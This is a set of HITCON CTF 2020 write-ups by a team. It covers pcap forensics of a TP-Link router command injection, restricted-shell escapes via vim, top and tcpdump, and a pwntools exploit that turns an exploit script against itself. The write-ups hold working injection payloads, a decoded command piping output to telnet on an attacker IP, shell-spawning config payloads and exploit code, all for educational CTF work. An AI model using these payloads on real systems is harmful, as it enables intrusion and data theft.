<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-frenchroomba
description: CTF writeups and security challenges by FrenchRoomba.
---

# Writeups by FrenchRoomba

Source repository: `/repos/FrenchRoomba`

## Repository Index

- ctf-writeup-HITCON-CTF-2020/__TEMPLATE.md
- ctf-writeup-HITCON-CTF-2020/AC1750/README.md
- ctf-writeup-HITCON-CTF-2020/baby-shock/README.md
- ctf-writeup-HITCON-CTF-2020/oShell/README.md
- ctf-writeup-HITCON-CTF-2020/revenge-of-baby-shock/README.md
- ctf-writeup-HITCON-CTF-2020/revenge-of-pwn/README.md
- ctf-writeup-HITCON-CTF-2020/tenet/README.md
- ctf-writeup-HITCON-CTF-2020/welcome/README.md

## Writeup Content


### File: ctf-writeup-HITCON-CTF-2020/AC1750/README.md

# AC1750
_Category: forensics_

## Description
> My router is weird, can you help me find the problem?
>
> ac1750-452ca8a9038502712d30c628d3444e5a22894611f1286b7a818203bdf838b434.tar.gz
>
> Author: Jeffxx
## Solution
We were given a pcap file of the traffic between a router (192.168.0.1) and an attacker (192.168.0.105). We can see towards the end of the pcap file that the router returned a directory listing to the attacker.

![dir_list](dir_list.png)

Searching about the challenge name we came across this article https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo that detailed a command injection vulnerability in this specific router (TP-Link Archer A7). The post also specified that the UDP packets are encrypted in AES-CBC with a static key and IV. Also, we also know from the blog post that it's only using half the key (128-bit), thus we have the following key and IV.

```
key: TPONEMESH_Kf!xn?
IV: 1234567890abcdef
```

Since we were only given the pcap file, this indicated that the flag must be in it. Therefore, we proceed to decrypting the UDP packets in the traffic dump. Despite the gibberish at the beginning, we can still see some valid strings. More specifically, we can see the attribute to `slave_mac` contained some commands, in this case `;echo >f;`.

![udp_decrypt](udp_decrypt.png)



If we decrypt another packet, we can see different commands executed in the same field.

![udp_decrypt2](udp_decrypt2.png)

Therefore, it is pretty clear now that we have to decrypt all the UDP packets. To do this, one of our team member suggested scapy. The script looks like

```python
from scapy.all import *
from Crypto.Cipher import AES

cipher = AES.new("TPONEMESH_Kf!xn?", AES.MODE_CBC, "1234567890abcdef")

packets = rdpcap('ac1750.pcapng')

# iterate through every packet
for p in packets:
    if UDP in p:
        try:
            # We skip the first 16 bytes to properly decrypt the packet
            c = raw(p.load)[16:]
            try:
                d = str(cipher.decrypt(c))
                tmp = d.split(',')[3]
                # print(tmp)
                if 'printf' in tmp:
                    print(tmp[27], end="")
            except:
                pass
        except:
            pass
```
If we only print `tmp`, we'll see something like

```sh
☁  ac1750  python3 test.py
 "slave_mac": "\';echo>f;\'"
 "slave_mac": "\';printf \'(\'>>f;\'"
 "slave_mac": "\';printf \'l\'>>f;\'"
 "slave_mac": "\';printf \'s\'>>f;\'"
 "slave_mac": "\';printf \' \'>>f;\'"
 "slave_mac": "\';printf \'-\'>>f;\'"
 "slave_mac": "\';printf \'l\'>>f;\'"
 "slave_mac": "\';printf \'&\'>>f;\'"
 "slave_mac": "\';printf \'&\'>>f;\'"
 "slave_mac": "\';printf \'e\'>>f;\'"
 "slave_mac": "\';printf \'c\'>>f;\'"
 "slave_mac": "\';printf \'h\'>>f;\'"
 "slave_mac": "\';printf \'o\'>>f;\'"
 "slave_mac": "\';printf \' \'>>f;\'"
 "slave_mac": "\';printf \'h\'>>f;\'"
 "slave_mac": "\';printf \'i\'>>f;\'"
 "slave_mac": "\';printf \'t\'>>f;\'"
 "slave_mac": "\';printf \'c\'>>f;\'"
 "slave_mac": "\';printf \'o\'>>f;\'"
 "slave_mac": "\';printf \'n\'>>f;\'"
 "slave_mac": "\';printf \'{\'>>f;\'"
"error_msg":"Internal Error!"}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
 "slave_mac": "\';printf \'W\'>>f;\'"
 "slave_mac": "\';printf \'h\'>>f;\'"
 "slave_mac": "\';printf \'y\'>>f;\'"
 "slave_mac": "\';printf \'_\'>>f;\'"
 "slave_mac": "\';printf \'c\'>>f;\'"
 "slave_mac": "\';printf \'a\'>>f;\'"
```
Finally, if we extract all the characters printed and combine them, we get the flag.

```sh
(ls -l&&echo hitcon{Why_can_one_place_be_injected_twice}>fag&&ls -l)|telnet 192.168.0.105 4321%
```



### File: ctf-writeup-HITCON-CTF-2020/baby-shock/README.md

# Baby Shock
_Category: misc_

## Description
> `nc 54.248.135.16 1986`

## Short Solution
```sh
id ;vim
exit
:shell
/readflag
```

## Solution

When we connect to the server, we are running in a restricted shell, with very few commands available to us:
```sh
connected!
welcome to Baby shock, doo, doo, doo, doo, doo, doo!!!
> help
> Available Commands: 
pwd ls mkdir netstat sort printf exit help id mount df du find history touch
>  vim
> bad command: vim
```

We can tell that some characters have been blacklisted by using them with a comment, e.g.:
```sh
> id # foo
> uid=1128 gid=2020
id # -
> bad command: id # -
```

From this we can determine that attacking the programs we are allowed to access directly is not likely to be fruitful, as all of those programs listed will require at least a <kbd>-</kbd> character to be exploited.

Instead, attempting to attack the shell itself, it doesn't take long to see that a <kbd>;</kbd> is allowed:
```sh
> id # ;
> uid=1128 gid=2020
```

This allows us to run commands outside of the restricted shell:
```sh
> id ; hostname
> uid=1128 gid=2020
ip-172-31-11-96
```

Now we just need to find a program that will let us execute commands. This is slightly complicated due to the way input handling is within the restricted shell. As a result, attempting to run bash directly does not produce the desired results:
```sh
> id ; bash
> uid=1128 gid=2020
whoami
> bad command: whoami
```

Instead of attempting to understand these issues, we simply used `vim` to launch a fully interactive shell. It still required a little coaxing, but by typing the solution from the beginning of the writeup in the correct order, we get a fully interactive shell:
```sh
> id ; vim
> uid=1128 gid=2020 groups=2020
Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal
exit
:shell
/readflag
hitcon{i_Am_s0_m155_s3e11sh0ck}
```



### File: ctf-writeup-HITCON-CTF-2020/oShell/README.md

# oShell
_Category: 🍊_

## Description
> Simple shell escaping!
> (Same team-token keeps in the same environment)
>
> `ssh oshell@54.150.148.61` (pwd=oshell)
>
> Author: Orange

## Short Solution
Connecting to the server gives users a restricted shell. This shell can execute `htop` and `enable`. By using `htop` to run `strace` on the `enable` process, it is possible to see the secret enable password, granting access to more commands.

The elevated command shell enables the extra command `tcpdump`. This can be used to write semi-arbitrary data (encapsulated packet payloads) contents to an arbitrary file, in this case, the configuration file for the `top` utility:
```sh
tcpdump -w /home/oShell/.toprc -s 500 icmp
```

Running `ping` from the environment allows us to solicit ICMP echo responses, in which we control the payload section of the packet. We can embed valid `top` configuration syntax in these responses (note that `top` will only parse this is the components are separated by literal tab characters), and `tcpdump` will write them to a file for us:
```sh
pipe	x	sh 1>&0
```

Once this has been written to `.toprc`, we can run `top` and press <kbd>shift</kbd> + <kbd>y</kbd>, <kbd>x</kbd>, and <kbd>return</kbd> to cause top to launch `sh` for us.

Lastly, we can run `/readflag`, a suid root binary which outputs the flag.

## Long Solution
### Initial Recon
When connecting to the server we need to specify a "team-token", which grants us access to a segregated container. This will come in handy later.
```sh
$ ssh oshell@54.150.148.61
oshell@54.150.148.61's password:
Team token: [redacted]
[*] Initializing instance...

Welcome to
        __  _            _  _
  ___  / _\| |__    ___ | || |
 / _ \ \ \ | '_ \  / _ \| || |
| (_) |_\ \| | | ||  __/| || |
 \___/ \__/|_| |_| \___||_||_|

shell~$ 
```

This command shell looks like it's fairly restricted, and doesn't seem to be based on any existing shell. We are able to get a list of commands we can run using `help`:
```sh
oshell~$ help
Available commands:
  help
  exit
  id
  ping
  ping6
  traceroute
  traceroute6
  arp
  netstat
  top
  htop
  enable
```

We can also see that most of these binaries are just applets compiled in to BusyBox:
```sh
oshell~$ ping --help
BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary.
[...]
```

At this stage, we can get some hints from the wonderfully useful [GTFOBins](https://gtfobins.github.io/) project. This helps us figure out which of the commands available to us can be used for breaking out of the restricted shell.

The container stops running after 300 seconds at which the shell disconnects and the container is rebuilt.

### Elevated Shell
With the binaries we have access to there is no direct way to break out of the restricted shell. Instead, we can focus on elevating our shell using the `enable` command. This command asks for a password:
```sh
oshell~$ enable
Password:
Wrong password :(
```

We can use the `strace` functionality of `htop` to analyze the process and determine what it is doing. When we run the `enable` command, we don't see an entry in `htop`:
```sh
  PID USER      PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command
   11 oShell     20   0  3512  1120   868 R  0.0  0.0  0:00.04 htop
    1 root       20   0  1492     4     0 S  0.0  0.0  0:00.26 sleep 300
    6 oShell     20   0 34516  5492  2040 S  0.0  0.0  0:00.35 python /oShell.py
```

This tells us that the `enable` command is part of the `oShell.py` script, rather than an external binary.

Now we know what process it is, we can run `strace` using `htop` in one window, while running `enable` in the other. To have `htop` run `strace` for us we just need to press <kbd>s</kbd> while the Python process is selected:
```
{st_mode=S_IFCHR|0666, st_rdev=makedev(5, 0), ...}) = 0
ioctl(3, TIOCGWINSZ, {ws_row=0, ws_col=0, ws_xpixel=0, ws_ypixel=0}) = 0
ioctl(3, TCGETS, {B38400 opost isig icanon echo ...}) = 0
ioctl(3, TCGETS, {B38400 opost isig icanon echo ...}) = 0
ioctl(3, SNDCTL_TMR_CONTINUE or TCSETSF, {B38400 opost isig icanon -echo ...}) =
writev(3, [{iov_base="Password: ", iov_len=10}, {iov_base=NULL, iov_len=0}], 2)
readv(3, [{iov_base="", iov_len=0}, {iov_base="test\n", iov_len=1024}], 2) = 5
ioctl(3, TCGETS, {B38400 opost isig icanon -echo ...}) = 0
ioctl(3, SNDCTL_TMR_CONTINUE or TCSETSF, {B38400 opost isig icanon echo ...}) =
writev(3, [{iov_base="", iov_len=0}, {iov_base="\n", iov_len=1}], 2) = 1
close(3)                                = 0
open("/enable.secret", O_RDONLY)        = 3
fstat(3, {st_mode=S_IFREG|0444, st_size=31, ...}) = 0
fstat(3, {st_mode=S_IFREG|0444, st_size=31, ...}) = 0
lseek(3, 0, SEEK_CUR)                   = 0
lseek(3, 0, SEEK_CUR)                   = 0
readv(3, [{iov_base="this-is-secret-7ce3ff0e2c8fd2a7", iov_len=31}, {iov_base=""
readv(3, [{iov_base="", iov_len=0}, {iov_base="", iov_len=1024}], 2) = 0
close(3)                                = 0
select(0, NULL, NULL, NULL, {tv_sec=1, tv_usec=0}) = 0 (Timeout)
writev(1, [{iov_base="Wrong password :(", iov_len=17}, {iov_base="\n", iov_len=1
```

The relevant lines from this show us that it opens `/enable.secret`, then reads the contents of the file. In this case, the enable password is revealed to be `this-is-secret-7ce3ff0e2c8fd2a7`. This will change every time the container rebuilds, but is relatively quick to find even manually each time.

Now we can execute `enable` and get an "elevated" shell:
```sh
oshell~$ enable
Password:
(enabled) oshell~# 
```

### Break Out Part 1 - Journey to File Write
Now we have our elevated shell, we can see we get some extra commands available to us:
```sh
(enabled) oshell~# help
Available commands:
  help
  exit
  id
  ping
  ping6
  traceroute
  traceroute6
  arp
  netstat
  top
  htop
  ifconfig
  tcpdump
  enable
```

The most interesting of these is `tcpdump`. This allows us to write a `pcap` file to an arbitrary location on disk using the `-w` flag consisting of packets received from the network. Unfortunately, the contents of this file cannot be directly controlled as it encapsulates each packet with a pcap header in the file. Fortunately, many Linux utilities are lenient in their parsing of configuration files and so it is likely we can inject arbitrary configuration lines that `top` will parse.

One of the simpliest ways to cause a packet to be recieved by `tcpdump` is the `ping` command. On most ping implementations a pattern (`-p`) argument can be used to supply the ping packet payload content. The version of `ping` available in the environment is from `busybox`, which only allows a single repeating byte to be specified as a payload:
```sh
$ ping --help
BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary.
```

We got stuck here for a while thinking about ways to get a packet onto the system. Our thoughts included:
* Abusing the SSH connection used to access the environment to set up a tunnel
* Traceroute ICMP responses with
* Returning DNS PTR or A records with encoded payloads

Eventually we realised that while the system itself doesn't allow us to send it incoming packets due to it being a container without a dedicated IP, it does receive responses to `ping` Echo requests sent out to the Internet. This gives us a chance to specify a custom payload in an Echo response, which will be dutifully stored by `tcpdump`. To help us test this we used a script one of our team members had prepared earlier, called [TLS Hello Modify](https://github.com/fincham/nfqueue-break-tls-handshake/blob/master/tls_hello_modify.py).

We modified this script to capture ICMP packets leaving a machine and overwrite the payload field of those packets:
```py
payload = "payload goes here"
parsed[ICMP].load = parsed[ICMP].load[0:len(parsed[ICMP].load) - len(payload)] + payload
```

Initially we tried just replacing the entire payload, but this resulted in the packets not being recieved by the server. As it wasn't clear at what point on the network path these modified packets were being discarded, we didn't investigate further, instead trying a few different ways of replacing or modifying the ICMP payload until we managed to get a packet that got through all the firewalls between our server and the CTF server. In English, the end of the original ICMP content is replaced with our payload.

Putting this all together, we are able to run our `tcpdump` command and write our payload to a path we specify. Now we just need a payload and path for it.

### Break Out Part 2 - Shell City
Now we can concerntrate on getting a shell. One option is to use the `post-rotate` command feature in `tcpdump`, but we investigated this and found the use of `top` would be simpler due to it executing our process already attached to our TTY.

The `top` command will read configuration from `~/.toprc`. This allows us to specify arbitrary commands for `top` to execute through the "Inspect" function. This is discussed in the [top GTFOBins page](https://gtfobins.github.io/gtfobins/top/).

To begin, we need the full, expanded path to the `.toprc` file, which we can get by launching `top` and pressing <kbd>w</kbd>:
```
 Wrote configuration to '/home/oShell//.toprc'
```

The payload we decided on was:
```

pipe	x	sh 1>&0

```

This will simply execute a shell after we choose the `x` inspection option in `top`. It's important to note:

* The tab characters before and after `x` are required and cannot be spaces.
* The newlines before and after the payload are also required so that it doesn't have extra bytes around it.

### Break Out Part 3 - All together now
Putting this together, we can run our ICMP modification script on a server we control. We can run `tcpdump -w /home/oShell/.toprc -s 500 icmp` to capture ICMP packets and write them to our `.toprc` file. Lastly, we can run `ping [our-server-ip] -c 1` to send a packet and wait for the response.

This writes a strange, but still valid, file that `top` can interpret as a configuration. Now we open `top`, press <kbd>shift</kbd> + <kbd>y</kbd> to inspect a process, <kbd>return</kbd> to select the default PID, then select <kbd>x</kbd> (the name of the command we used in our payload), and press <kbd>return</kbd> a final time. We now have an interactive shell!

The formatting isn't great, but we can type `ls` to see the directory output in `/`:
```sh
/ $ ls -lah
total 908
drwxr-xr-x    1 root     root        4.0K Nov 28 04:21 .
drwxr-xr-x    1 root     root        4.0K Nov 28 04:21 ..
-rwxr-xr-x    1 root     root           0 Nov 28 04:21 .dockerenv
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 bin
drwxr-xr-x    5 root     root         340 Nov 28 04:21 dev
-r--r--r--    1 1002     1002          31 Nov 28 04:21 enable.secret
drwxr-xr-x    1 root     root        4.0K Nov 28 04:21 etc
-r--------    1 root     root          35 Nov 26 10:44 flag
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 home
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 lib
drwxr-xr-x    5 root     root        4.0K Mar  6  2019 media
drwxr-xr-x    2 root     root        4.0K Mar  6  2019 mnt
-rwxrwxr--    1 root     root        3.8K Nov 25 10:23 oShell.py
dr-xr-xr-x 1004 root     root           0 Nov 28 04:21 proc
-rwsr-sr-x    1 root     root      825.4K Nov 19 10:54 readflag
drwx------    2 root     root        4.0K Mar  6  2019 root
drwxr-xr-x    2 root     root        4.0K Mar  6  2019 run
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 sbin
drwxr-xr-x    3 root     root        4.0K Nov 27 19:58 share
drwxr-xr-x    2 root     root        4.0K Mar  6  2019 srv
dr-xr-xr-x   13 root     root           0 Nov 28 04:21 sys
drwxrwxrwt    2 root     root        4.0K Mar  6  2019 tmp
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 usr
drwxr-xr-x    1 root     root        4.0K Mar  6  2019 var
```

From here, we can see a SUID `/readflag` which we can execute. This gives us the flag!
```sh
/ $ ./readflag
HITCON{A! AAAAAAAAAAAA! SHAR~K!!!}
```



### File: ctf-writeup-HITCON-CTF-2020/revenge-of-baby-shock/README.md

# Revenge of Baby Shock
_Category: misc_

## Description
> `nc 13.113.249.141 1987`

## Short Solution
```sh
> id () vim
> id
> Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal
exit
:shell                                                        
/readflag
hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}
```

## Solution

To begin, we connect and see what we have:
```sh
connected!
welcome to Baby shock's revenge !!!
> help
> Available Commands: 
pwd ls mkdir netstat sort printf exit help id mount df du find history touch
```
This challenge is almost exactly the same as the earlier Baby Shock, however the <kbd>;</kbd> character has been restricted.

As we weren't sure what characters were best to use at this point, we wrote a pwntools script that would verify what printable ascii characters can be sent to the server without causing an error. This is relatively simple as the check is performed before the command runs, so we can test it by checking if we get an error when running a command like `id # ;`. If we get an error, the character (<kbd>;</kbd> in this case) wasn't allowed.

The full list of characters allowed isn't particularly interesting, but we did notice that parenthesis, both <kbd>(</kbd> and <kbd>)</kbd> were allowed. This lets us re-define an allowed command as a function, which lets us execute an arbitrary command. From here, we can continue exploitation as in the original Baby Shock challenge.

To launch vim, we simply redefine the `id` command:
```sh
> id () vim
> id
```



### File: ctf-writeup-HITCON-CTF-2020/revenge-of-pwn/README.md

# Revenge of Pwn
_Category: misc, pwn_

## Description
> Have you ever thought those challenges you pwned may retaliate someday?
> `nc 3.115.58.219 9427`
> [revenge_of_pwn-255196bb99d75512732a4109f154103b4bc428e6e29e2cdcc69e44aee67ea75f.tar.gz](revenge_of_pwn-255196bb99d75512732a4109f154103b4bc428e6e29e2cdcc69e44aee67ea75f.tar.gz)

## README.md (from the challenge files)

`exploit.py` is able to exploit `chal/vuln`.

```
exploit.py --- pwn --->   chal/vuln
                       127.0.0.1:1337
```

Now you have the chance to *replace* the binary listening on 1337 port,
and you need to pwn the script who is pwning your binary!

```
exploit.py --- (will try to) pwn --->  <your uploaded file>
    ^                                     127.0.0.1:1337
    |
    |
you need to pwn this
```

The flag is located at `/home/deploy/flag`, which is readable by `exploit.py`.

## Solution

We need to coax `exploit.py` into giving us a copy of the flag, which it can read. To get started, we need to understand the `exploit.py` script itself.
Looking through the source, there are only a few places where we get a chance to specify user input. They are as follows:
```py
stk = int(r.recvline(), 16)
log.info('stk @ ' + hex(stk))
# some time later
shellcraft.read('rbp', stk + 48, 100) +
shellcraft.mov('rax', stk + 48) + 'jmp rax'
r.send(b'@' * 40 + p64(stk+48) + stage1)
```
This cannot be used in any meaningful way for us because it is cast to an integer before being used in shellcode. Even if we do supply a "malicious" value, it will only result in our program being sent bogus shellcode. Another option is as follows:
```py
d = str(s.recvuntil('@')[:-1], 'ascii')
log.info('sock fd @ ' + fd)
stage2 = asm(shellcraft.stager(fd, 0x4000))
```
This works much better for us, because we have an unlimited length string that is placed directly into the shellcode before it is assembled. It is not obvious from the function, but `shellcraft.stager` will simply concatinate the value for `fd` into assembly.

Now all we need to do is find something we can put in the assembly that when assembled, will let us see the flag. The simpliest option here is just to `#include flag.txt`, though there are some other options that result in the flag being sent back to our program we upload instead.

The final hurdle is the size limit on the ELF we upload:
```
ELF size? (MAX: 6144)
9999
¯\_(ツ)_/¯
```

The easiest option here is to just use shellcraft to generate a very small ELF with the payload we require.

Putting it all together, we end up with:
```py
from pwn import *
context.arch = 'amd64'

stk = "stack address @ 0x1\n"
evil_str = "1\n#include \"/home/deploy/flag\"@"

elf = make_elf(
    asm(
        shellcraft.pushstr(stk) +
        shellcraft.write(1, 'rsp', len(stk)) +
        """
        MOV    rcx, 5000000000
L1:
DEC    rcx
JNZ    L1
        """ +
        shellcraft.amd64.connect('127.0.0.1', 31337) +
        shellcraft.pushstr(evil_str) +
        shellcraft.write('rbp', 'rsp', len(evil_str)) +
        shellcraft.read('rbp', 'rsp', 10000) +
        shellcraft.write('rbp', 'rsp', 10000)
    )
)

io=remote("3.115.58.219", 9427)

io.recvuntil('ELF size? (MAX: 6144)')
io.sendline(str(len(elf)))
io.send(elf)
io.stream()
```

The only extra code in there is a busy loop, which helps make sure we don't try to connect to the stage2 handler too early.



### File: ctf-writeup-HITCON-CTF-2020/tenet/README.md

# Tenet
_Category: misc, reverse_

## Description
> You have to start looking at the world in a new way.
> 
> `nc 52.192.42.215 9427`
> [tenet-1050118538f6f01c2ad0049587dc0828e8a4f132e539e110f0cb04a8c17b78bf.tar.gz](tenet-1050118538f6f01c2ad0049587dc0828e8a4f132e539e110f0cb04a8c17b78bf.tar.gz)

## Short Solution

We need to provide the server shellcode that when run fowards, zeros out some memory containing a secret cookie, and restores the secret cookie when run backwards.
This can be achieved by smuggling the secret cookie within the AVX2 YMM register, which is not cleared between the program running.

## Solution

The archive we are given contains `server.rb` and `timemachine`. We need to understand these before we can begin solving the challenge.

### server.rb

When run, the server code asks for the length of your shellcode, then the shellcode itself. This shellcode is added to some hard-coded ELF content to produce an executable file.
The program that is created is then passed to the `timemachine`.
For the purposes of the challenge, the specifics of the rest of the script aren't relevant, and we didn't spend any time figuring them out (beyond the path to the file the script sends to the timemachine, so that we could verify it was working as intended).

### timemachine

The timemachine is more complicated. Conceptually, it forks to run your program/shellcode and attaches to the process with ptrace. Before the program is run, a secret cookie is injected into the childs memory with ptrace.
The timemachine then runs your code, one step at a time. At each step, a check is performed to see whether the next instruction is the `exit` syscall. If so, the child exists this main loop. Otherwise, the child continues performing instructions step by step, until the maximum number of steps (`0xFFF`), at which point the child is killed with an error.
During this main loop, each step results in the `rip` register (the instruction pointer, or program counter) being saved to an array.

Once the child successfully exists the main loop (by using the `exit` syscall), the timemachine verifies whether the secret cookie has been zeroed out of memory. If it has not, an error is produced and execution halts.

The child now has it's registers reset with the ptrace calls `PTRACE_SETREGS` and `PTRACE_SETFPREGS`, with all registers being set to 0.

The timemachine now sets `rip` in the child to the previously executed instruction (as recorded in the `rip` array during the forwards execution), then executes a single step. This continues in a loop until all `rip` values have been executed.

The childs memory is now inspected to verify that the secret cookie is back in the memory where it was first stored.

### Our shellcode

Now we understand what the program does, we can think of some ways to achieve what we need.

Our first thought was to smuggle the value in a memory location not checked by the timemachine, however no such memory exists. While the obvious choice would be the stack itself (since we never need to call a function in our own shellcode), the timemachine prevents us writing any stack values before our shellcode begins.

The solution we ended up trying that worked was to smuggle the value in the registers themselves. While there is a call to clear both the normal registers and floating point registers by the time machine, the ptrace API is such that only 128bits of the AVX registers can be set. This means if we can store a secret in the upper 128bits, it won't be cleared by ptrace. This seems to be a limitation of ptrace itsef.

### Our shellcode: Hacking Edition

Using all our hard-earned reversing knowledge, we can put together the following instructions that will smuggle our value appropriately:
```asm
# Move the secret value into the xmm1 register
movq xmm1, [0x2170000]
# Permute the ymm1 register such that the lower value (xmm1) is moved into the high bits too
VPERM2F128 ymm1, ymm1, ymm1, 0

# Erase the secret from memory when forwards, store the secret into memory when backwards
xor rax, rax
mov [0x2170000], rax

# Move the value from the xmm1 register into rax
movq rax, xmm1
# Permute the ymm1 register such that the higher value is stored into the lower bits
# When forward, this is the secret, and when backwards, this is still the secret, as it's never cleared
VPERM2F128 ymm1, ymm1, ymm1, 1

# Call exit() syscall
mov rax, 60
syscall
```

The script we used to automate creation of this exploit, as well as for testing, is the aptly named [hack.py](hack.py).





### File: ctf-writeup-HITCON-CTF-2020/welcome/README.md

# Welcome
_Category: reverse_

## Description
> It's a reverse challenge.
> 
> `ssh welcome@18.176.232.130`
> 
> password: hitconctf

## Solution
1. SSH into the target with the password `hitconctf`
```
ssh welcome@18.176.232.130
```
2. Type everyone's favourite comfort command `ls` and admire the cute ACSII [steam locomotive](https://github.com/mtoyoda/sl) normally associated with `sl`:
```
                      (@@) (  ) (@)  ( )  @@    ()    @     O     @     O      @
                 (   )
             (@@@@)
          (    )
        (@@@)
      ====        ________                ___________
  _D _|  |_______/        \__I_I_____===__|_________|
   |(_)---  |   H\________/ |   |        =|___ ___|      _________________
   /     |  |   H  |  |     |   |         ||_| |_||     _|                \_____A
  |      |  |   H  |__--------------------| [___] |   =|                        |
  | ________|___H__/__|_____/[][]~\_______|       |   -|                        |
  |/ |   |-----------I_____I [][] []  D   |=======|____|________________________|_
__/ =| o |=-~~\  /~~\  /~~\  /~~\ ____Y___________|__|__________________________|_
 |/-=|___|=    ||    ||    ||    |_____/~\___/          |_D__D__D_|  |_D__D__D_|
  \_/      \_O=====O=====O=====O/      \_/               \_/   \_/    \_/   \_/
```
3. "Reverse" `ls` as `sl`
```bash
$ sl
flag
```
4. Ah, the flag is in the file `flag`. Read it with `cat` (backwards, obviously):
```
$ tac galf
hitcon{!0202 ftcnoctih ot emoclew}
$ Connection to 18.176.232.130 closed.
```


### File: ctf-writeup-HITCON-CTF-2020/__TEMPLATE.md

# XXX Title
_Category: xxx_

## Description
> xxx copy from site

## Solution
1. describe
2. the
3. solution
